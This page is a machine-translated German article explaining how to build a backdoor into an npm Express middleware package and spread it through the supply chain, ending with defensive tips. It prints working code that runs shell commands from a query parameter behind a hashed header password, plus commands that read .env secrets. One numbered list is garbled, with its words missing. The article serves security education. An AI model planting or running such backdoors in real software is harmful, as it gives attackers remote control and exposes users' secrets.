<!doctype html>
<html class="no-js" lang="de">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩🏿 🛋️ 🔐 Kennen Sie Ihren Feind: Erstellen Sie eine Node.js-Hintertür 🔺 👩🏻‍⚖️ 🛌🏽</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Eine Hintertür in ihrem eigenen Code, die nahtlos mit dem Betriebssystem interagieren kann, ist einer der schlimmsten Albträume eines Entwicklers. Der...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Kennen Sie Ihren Feind: Erstellen Sie eine Node.js-Hintertür</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ruvds/blog/493706/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Eine Hintertür in ihrem eigenen Code, die nahtlos mit dem Betriebssystem interagieren kann, ist einer der schlimmsten Albträume eines Entwicklers. </font><font style="vertical-align: inherit;">Derzeit hat npm über 1,2 Millionen öffentliche Pakete. </font><font style="vertical-align: inherit;">In den letzten drei Jahren sind Projektabhängigkeiten zu einem idealen Ziel für Cyberkriminelle geworden. </font><font style="vertical-align: inherit;">Das npm-Ökosystem kann überraschend fragil sein, wenn die Entwicklergemeinschaft der Sicherheit keine besondere Aufmerksamkeit schenkt. </font><font style="vertical-align: inherit;">Als Beweis für diese Idee genügt es, die </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tippfehler</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> und den </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vorfall</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> mit dem Ereignisstrom-Paket npm abzurufen. </font><font style="vertical-align: inherit;">
Der Autor des Artikels, dessen Übersetzung wir heute veröffentlichen, möchte zu Bildungszwecken darüber sprechen, wie Hintertüren für die Node.js-Plattform erstellt werden.</font></font><br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://habrastorage.org/webt/3j/8a/0y/3j8a0ysn9-nbui6_stqwb783zcq.jpeg"></a><br>
<br><font style="vertical-align: inherit;"></font><br>
<a name="habracut"></a><br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist eine Hintertür?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hier ist die Definition des Begriffs „Hintertür“ in der </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Malwarebytes-</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Ressource </font><font style="vertical-align: inherit;">: „Im Bereich der Cybersicherheit ist eine Hintertür eine Methode, mit der autorisierte und nicht autorisierte Benutzer allgemeine Sicherheitsmaßnahmen umgehen und einen Root-Zugriff auf hoher Ebene auf ein Computersystem erhalten können. Netzwerkanwendung. </font><font style="vertical-align: inherit;">Nach einem solchen Zugriff auf das System können Cyberkriminelle über eine Hintertür persönliche und finanzielle Daten stehlen, zusätzliche Malware installieren und Geräte hacken. “ </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Hintertür besteht aus zwei Hauptteilen:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Schädlicher Code, der in ein angegriffenes System eingebettet und auf diesem ausgeführt wird</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ein offener Kommunikationskanal, über den ein Angreifer Befehle an eine Hintertür senden und einen Remotecomputer steuern kann.</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die auf dem Computer installierte Hintertür erhält Befehle, auf die bestimmte Aktionen ausgeführt werden. Hierbei kann es sich um Befehle handeln, die darauf abzielen, wertvolle Informationen aus dem System zu extrahieren, z. B. Umgebungsvariablen, oder um einen Angriff auf die Datenbank auszuführen. Darüber hinaus kann die Ausführung solcher Befehle zu einer Änderung anderer Prozesse führen, die einen einzelnen Computer oder das gesamte Netzwerk betreffen. Das Ausmaß des Angriffs hängt von den Berechtigungen der infizierten Anwendung ab. In unserem Fall handelt es sich um eine Anwendung, die für die Node.js.-Plattform geschrieben wurde. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Um eine vereinfachte Version des Programms zu erstellen, die den obigen Angriff implementiert, verwenden wir das Standardmodul </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">child_process</font></a><font style="vertical-align: inherit;"> , um den Code auszuführen</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Um die Kommunikation mit der Hintertür herzustellen, verwenden wir einen HTTP-Server. </font><font style="vertical-align: inherit;">Ich würde Ihnen raten, in diesem Fall das Express-Framework zu verwenden, das für seine enormen Funktionen bekannt ist. Was jedoch besprochen wird, kann mit anderen geeigneten Tools implementiert werden.</font></font><br>
<br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum brauchen wir child_process?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das Standardmodul Node.js </font></font><code>child_process</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kann zum Starten untergeordneter Prozesse verwendet werden. </font><font style="vertical-align: inherit;">Die Hauptidee hier ist, dass es uns die Möglichkeit gibt, Befehle (die über einen Standardeingabestream in den Prozess eingehen - </font></font><code>stdin</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) wie </font></font><code>pwd</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">oder </font><font style="vertical-align: inherit;">auszuführen </font></font><code>ping snyk.io</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">und dann das Ergebnis dieser Befehle (die Ausgabe kommt vom Ausgabestream - </font></font><code>stdout</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) und mögliche Fehlermeldungen (von) zu integrieren Stream </font></font><code>stderr</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) zum Hauptprogramm.</font></font><br>
<br>
<div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/e3c/666/71e/e3c66671ef56b974c1a7692f7962c479.png"></div><br>
<i><font color="#999999"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Prozessausführung und ihre Beziehung zu Standard-Eingabe-, Ausgabe- und Fehlerflüssen, die die Rolle von Eingabe- und Ausgabeflüssen für einen laufenden Systemprozess spielen.</font></font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
Es gibt verschiedene Möglichkeiten, untergeordnete Prozesse auszuführen. </font><font style="vertical-align: inherit;">Für diesen Angriff, ist es am einfachsten</font><font style="vertical-align: inherit;">eine Funktion zu verwenden</font></font><code>exec</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">die Sie und in den entsprechenden Puffer Rückruf erlaubt</font><font style="vertical-align: inherit;">was den bekommt in</font></font><code>stdout</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">und</font><font style="vertical-align: inherit;">Ströme</font></font><code>stderr</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Zum Beispiel, was als Ergebnis des Befehls ausgegeben wird</font></font><code>cat passwords.txt</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Bitte beachten Sie, dass eine Funktion</font></font><code>exec</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nicht der beste Weg ist, um lange Aufgaben wie auszuführen</font></font><code>ping snyk.io</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span>&nbsp; {exec} = <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>);<font></font>
<font></font>
exec(<span class="hljs-string">'cat .env'</span>, (err, stdout, stderr) =&gt; {
&nbsp;&nbsp;<span class="hljs-keyword">if</span>(err) <span class="hljs-keyword">throw</span> err
&nbsp;&nbsp;<span class="hljs-keyword">if</span>(stderr) <span class="hljs-keyword">return</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Execution error: <span class="hljs-subst">${stderr}</span>`</span>)
&nbsp;&nbsp;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Env file content:&nbsp; <span class="hljs-subst">${stdout}</span>`</span>)<font></font>
})<font></font>
</code></pre><br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie kombiniere ich die Exec-Funktion mit dem HTTP-Server?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich habe ein einfaches, unschuldig aussehendes Middleware-Paket </font><font style="vertical-align: inherit;">zur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Browserumleitung</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> für Express-Anwendungen entwickelt. </font><font style="vertical-align: inherit;">Nicht-Chrome-Benutzer werden zu </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">browserehappy.com weitergeleitet</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Ich werde bösartigen Code in dieses Paket aufnehmen. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Der Paketcode lautet ungefähr so:</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span> useragent = <span class="hljs-built_in">require</span>(<span class="hljs-string">'useragent'</span>);<font></font>
<font></font>
<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> ua = useragent.is(req.headers[<span class="hljs-string">'user-agent'</span>]);<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;ua.chrome ? next(): res.redirect(<span class="hljs-string">"https://browsehappy.com/"</span>)<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es reicht für das Opfer aus, das Paket zu installieren und in der Express-Anwendung auf dieselbe Weise zu verwenden, wie sie jedes Paket in der mittleren Ebene verwenden:</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">"express"</span>);
<span class="hljs-keyword">const</span> helmet = <span class="hljs-built_in">require</span>(<span class="hljs-string">"helmet"</span>)
<span class="hljs-keyword">const</span> browserRedirect = <span class="hljs-built_in">require</span>(<span class="hljs-string">"browser-redirect "</span>)<font></font>
&nbsp;<font></font>
<span class="hljs-keyword">const</span> app = express();<font></font>
&nbsp;<font></font>
app.use(browserRedirect())<font></font>
app.use(helmet())<font></font>
&nbsp;<font></font>
app.get(<span class="hljs-string">"/"</span>, (req, res)=&gt;{<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;res.send(<span class="hljs-string">"Hello Chrome User!"</span>)<font></font>
})<font></font>
&nbsp;<font></font>
app.listen(<span class="hljs-number">8080</span>)
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bitte beachten Sie, dass in diesem Fall </font></font><code>Helmet</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">die Anwendung </font><font style="vertical-align: inherit;">auch bei Verwendung </font><font style="vertical-align: inherit;">nicht vor Angriffen geschützt ist.</font></font><br>
<br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Schadcode</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Implementierung des Schadcodes ist recht einfach:</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span> {exec} = <span class="hljs-built_in">require</span>(<span class="hljs-string">"child_process"</span>)
<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);
<span class="hljs-keyword">const</span> useragent = <span class="hljs-built_in">require</span>(<span class="hljs-string">'useragent'</span>);<font></font>
&nbsp;<font></font>
<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//  </span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> {cmd} = req.query;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> hash = crypto.createHash(<span class="hljs-string">'md5'</span>)<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.update(<span class="hljs-built_in">String</span>(req.headers[<span class="hljs-string">"knock_knock"</span>]))<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.digest(<span class="hljs-string">"hex"</span>);<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;res.setHeader(<span class="hljs-string">"Content-Sec-Policy"</span>, <span class="hljs-string">"default-src 'self'"</span>)
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>(cmd &amp;&amp; hash === <span class="hljs-string">"c4fbb68607bcbb25407e0362dab0b2ea"</span>) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span> exec(cmd, (err, stdout, stderr)=&gt;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span> res.send(<span class="hljs-built_in">JSON</span>.stringify({err, stdout, stderr}, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>))<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;})<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;}<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//  </span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> ua = useragent.is(req.headers[<span class="hljs-string">'user-agent'</span>]);<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;ua.chrome ? next(): res.redirect(<span class="hljs-string">"https://browsehappy.com/"</span>)<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wie funktioniert unsere Hintertür? </font><font style="vertical-align: inherit;">Beachten Sie Folgendes, um diese Frage zu beantworten:</font></font><br>
<br>
<ol>
<li>,           .         .      md5- ( <code>p@ssw0rd1234</code>   <code>c4fbb68607bcbb25407e0362dab0b2ea</code>).           <code>knock_knock</code>. ,   ,  ,      .</li>
<li>,          .       ,     .        <code>Content-Sec-Policy</code>,      <code>Content-security-policy</code>.   —      .     .       Shodan,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="></a>: <code>/search?query=Content-Sec-Policy%3A+default-src+%27self%27</code>.</li>
<li>  <code>?cmd</code>         .         .       <code>victim.com/?cmd=whoami</code>  <code>?cmd=cat .env</code>        JSON.</li>
</ol><br>
<h2><font color="#3AC1EF">  </font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nachdem der Backdoor-Code fertig ist, müssen Sie überlegen, wie Sie das Schadpaket verteilen können. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Der erste Schritt besteht darin, das Paket zu veröffentlichen. Ich habe das Paket </font></font><code>browser-redirect@1.0.2</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">in npm veröffentlicht. Wenn Sie sich jedoch das GitHub-Repository des Projekts ansehen, ist der Schadcode nicht vorhanden. Überzeugen Sie sich selbst - werfen Sie einen Blick auf den </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Master-</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Projektzweig </font><font style="vertical-align: inherit;">und veröffentlichen Sie </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.0.2</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Dies ist möglich, weil npm den Code veröffentlichter Pakete nicht mit dem Code überprüft, der in einem System veröffentlicht wurde, das für die Arbeit mit Quellcode ausgelegt ist. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Obwohl das Paket in npm veröffentlicht wird, sind seine Verbreitungschancen immer noch sehr gering, da potenzielle Opfer es noch finden und installieren müssen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Eine andere Möglichkeit, ein Paket zu verteilen, besteht darin, ein schädliches Modul als Abhängigkeit für andere Pakete hinzuzufügen. Wenn ein Angreifer Zugriff auf ein Konto mit den Veröffentlichungsrechten eines wichtigen Pakets hat, kann er eine neue Version eines solchen Pakets veröffentlichen. Zu den Abhängigkeiten der neuen Version des Pakets gehört auch eine Hintertür. Infolgedessen sprechen wir über die direkte Einbeziehung eines Schadpakets in die Abhängigkeiten eines beliebten Projekts (werfen Sie einen Blick auf die </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Analyse des</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Vorfalls, der mit event-stream aufgetreten ist). Alternativ kann ein Angreifer versuchen, PR in einem Projekt zu erstellen, indem er entsprechende Änderungen an der Sperrdatei vornimmt. Lesen Sie </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hier darüber</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ein weiterer wichtiger Faktor, der berücksichtigt werden muss, ist, ob der Angreifer Zugriff auf die Anmeldeinformationen (Benutzername und Passwort) einer Person hat, die ein bestimmtes beliebtes Projekt unterstützt. Wenn ein Angreifer über solche Daten verfügt, kann er problemlos eine neue Version des Pakets veröffentlichen - genau wie bei </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eslint</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aber selbst wenn jemand, der das Projekt unterstützt, die Zwei-Faktor-Authentifizierung verwendet, um es zu veröffentlichen, riskiert er es dennoch. Wenn ein kontinuierliches Integrationssystem zum Bereitstellen neuer Versionen des Projekts verwendet wird, muss die Zwei-Faktor-Authentifizierung deaktiviert werden. Wenn ein Angreifer ein funktionierendes npm-Token für ein kontinuierliches Integrationssystem stehlen kann (z. B. aus versehentlich veröffentlichten Protokollen, aus Datenlecks und aus anderen ähnlichen Quellen), kann er neue Versionen mit schädlichem Code bereitstellen . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bitte beachten Sie, dass die </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">neue API</font></a><font style="vertical-align: inherit;"> veröffentlicht wurde </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(befindet sich noch im privaten Beta-Status), mit dem Sie herausfinden können, ob das Paket unter Verwendung der IP-Adresse des TOR-Netzwerks veröffentlicht wurde und ob beim Veröffentlichen eine Zwei-Faktor-Authentifizierung verwendet wurde. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Darüber hinaus können Angreifer den Schadcode so konfigurieren, dass er in Form eines Skripts ausgeführt wird, das vor der Installation oder nach der Installation eines npm-Pakets ausgeführt wird. Es gibt </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Standard-</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Lifecycle- </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">Hooks für</font></a><font style="vertical-align: inherit;"> npm-Pakete, mit denen Sie Code zu einem bestimmten Zeitpunkt auf dem Computer eines Benutzers ausführen können. Ein System zum Organisieren von Testprojekten in einem Browser, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Puppeteer</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , verwendet diese Hooks beispielsweise, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">um</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Chromium auf einem Hostsystem zu installieren. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ryan Dahl </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">sagte</font></a><font style="vertical-align: inherit;"> bereits</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen zu diesen Sicherheitsanfälligkeiten auf der JSConf EU 2018. Die Node.js-Plattform benötigt ein höheres Schutzniveau, um diesen und andere Angriffsmethoden zu verhindern. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Hier einige Schlussfolgerungen aus der </font><font style="vertical-align: inherit;">Open-Source- </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sicherheitsstudie für</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Software:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">78% der Schwachstellen befinden sich in indirekten Abhängigkeiten, was den Prozess der Beseitigung solcher Schwachstellen erschwert.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Innerhalb von 2 Jahren haben die Sicherheitslücken in Bibliotheken um 88% zugenommen.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">81% der Befragten sind der Meinung, dass Entwickler selbst für die Sicherheit verantwortlich sein sollten. </font><font style="vertical-align: inherit;">Sie glauben außerdem, dass die Entwickler darauf nicht gut vorbereitet sind.</font></font></li>
</ul><br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ergebnisse: Wie schützen Sie sich vor Hintertüren?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das Steuern von Abhängigkeiten ist nicht immer einfach, aber ein paar Tipps können Ihnen dabei helfen:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Verwenden Sie bekannte und unterstützte Bibliotheken.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beteiligen Sie sich am Gemeinschaftsleben und helfen Sie denen, die Bibliotheken unterstützen. </font><font style="vertical-align: inherit;">Die Hilfe kann das Schreiben von Code oder die finanzielle Unterstützung von Projekten umfassen.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Verwenden Sie </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NQP</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , um die neuen Abhängigkeiten Ihres Projekts zu analysieren.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Verwenden Sie Snyk, um sich über Schwachstellen auf dem Laufenden zu halten und Ihre Projekte zu überwachen.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Analysieren Sie den Code der verwendeten Abhängigkeiten, der in npm gespeichert ist. </font><font style="vertical-align: inherit;">Beschränken Sie sich nicht darauf, Code von GitHub oder anderen ähnlichen Systemen anzuzeigen.</font></font></li>
</ul><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Liebe Leser! </font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie schützen Sie Ihre Projekte mit dem Code eines anderen?</font></font><br>
<br>
